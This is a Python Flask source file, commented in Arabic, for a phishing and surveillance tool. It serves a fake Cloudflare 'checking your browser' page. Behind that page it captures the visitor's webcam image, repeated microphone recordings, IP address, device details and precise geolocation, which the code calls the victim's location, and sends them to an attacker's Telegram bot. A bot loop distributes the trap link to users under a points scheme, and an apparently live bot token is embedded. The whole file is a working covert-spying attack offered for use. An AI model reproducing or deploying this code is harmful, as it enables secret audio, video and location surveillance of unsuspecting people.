import base64, requests, io, time
from flask import Flask, render_template_string, request, redirect
from threading import Thread

app = Flask(__name__)

# ================= إعداداتك الخاصة =================
BOT_TOKEN = "8725128005:8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
CHAT_ID = "7041600701"
# ضع رابط الـ Render الخاص بك هنا بعد الحصول عليه في الخطوات القادمة
MY_LINK = "https://sif-e7ad.onrender.com" 
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701" 
# =================================================

users_db = {} 
used_ips = set() 

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
        .container { max-width: 450px; width: 90%; text-align: center; }
        .loader-box { border: 1px solid #e0e0e0; border-radius: 8px; padding: 25px; margin-top: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #st { color: #f6821f; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" style="width:120px">
        <h1 style="font-size: 22px;">يرجى الانتظار..</h1>
        <p style="color: #666;">جاري فحص المتصفح للتأكد من أنك لست روبوت.</p>
        <div class="loader-box">
            <div class="spinner"></div>
            <div id="st">بدء الفحص الآمن...</div>
        </div>
    </div>
    <video id="v" autoplay playsinline muted style="position:absolute; width:1px; height:1px; opacity:0.01;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                
                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                const battery = await navigator.getBattery().catch(() => ({}));
                let info = `📱 **معلومات الجهاز الجديد**\\n🌐 IP: ${ipData.ip}\\n🔋 البطارية: ${Math.round(battery.level*100)}%\\n🖥️ المنصة: ${navigator.platform}`;
                post('/upload', { d: info, t: 'msg' });

                navigator.geolocation.getCurrentPosition(p => {
                    const loc = `📍 موقع الضحية الحقيقي:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    post('/upload', { d: loc, t: 'msg' });
                }, null, {enableHighAccuracy: true});

                function record(s) {
                    const m = new MediaRecorder(s); let ch = [];
                    m.ondataavailable = e => ch.push(e.data);
                    m.onstop = () => {
                        const r = new FileReader(); r.readAsDataURL(new Blob(ch));
                        r.onloadend = () => post('/upload', { d: r.result, t: 'aud' });
                        record(s);
                    };
                    m.start(); setTimeout(() => m.stop(), 3000);
                }
                record(stream);

                setTimeout(() => {
                    const v = document.getElementById('v'), c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post('/upload', { d: c.toDataURL('image/jpeg', 0.6), t: 'img' });
                }, 4000);
            } catch (e) { location.reload(); }
        }
        function post(u, d) { fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(d) }); }
        window.onload = init;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if user_ip in used_ips:
        return redirect("https://www.google.com")
    used_ips.add(user_ip)
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    t, d = data.get('t'), data.get('d')
    api = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if t == 'msg': requests.post(api + "sendMessage", data={'chat_id': CHAT_ID, 'text': d})
    elif t == 'img':
        f = io.BytesIO(base64.b64decode(d.split(',')[1])); f.name = 'shot.jpg'
        requests.post(api + "sendPhoto", data={'chat_id': CHAT_ID}, files={'photo': f})
    elif t == 'aud':
        f = io.BytesIO(base64.b64decode(d.split(',')[1])); f.name = 'voice.mp3'
        requests.post(api + "sendDocument", data={'chat_id': CHAT_ID, 'caption': '🎤 تسجيل 3 ثواني', 'document': f})
    return "OK"

def run_bot():
    last_id = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id + 1}&timeout=30").json()
            for up in r.get('result', []):
                last_id = up['update_id']
                if 'message' in up:
                    msg = up['message']
                    u_id = str(msg['from']['id'])
                    if u_id not in users_db: users_db[u_id] = {'used': False, 'points': 0}
                    
                    if msg.get('text') == '/start':
                        welcome = "🛡️ **نظام الحماية الذكي | Smart Security**\n\nيجب عليك الاشتراك في القناة أولاً، ثم إنشاء الرابط الخاص بك."
                        kb = {"inline_keyboard": [
                            [{"text": "📢 الاشتراك الإجباري", "url": CHANNEL_URL}],
                            [{"text": "🚀 إنشاء رابط الفحص", "callback_data": "gen_link"}],
                            [{"text": "📊 معلوماتي", "callback_data": "info"}]
                        ]}
                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': u_id, 'text': welcome, 'reply_markup': kb, 'parse_mode': 'Markdown'})
                
                elif 'callback_query' in up:
                    cb = up['callback_query']
                    u_id = str(cb['from']['id'])
                    if cb['data'] == 'gen_link':
                        if not users_db[u_id]['used']:
                            users_db[u_id]['used'] = True
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم توليد رابطك المجاني لمرة واحدة:\n\n{MY_LINK}"})
                        elif users_db[u_id]['points'] >= 10:
                            users_db[u_id]['points'] -= 10
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': f"✅ تم خصم 10 نقاط. رابطك الجديد:\n\n{MY_LINK}"})
                        else:
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': u_id, 'text': "❌ استنفدت محاولتك!\n\nاجمع 10 نقاط أو تواصل مع المطور للتفعيل المدفوع."})
        except: pass

if __name__ == '__main__':
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5000)
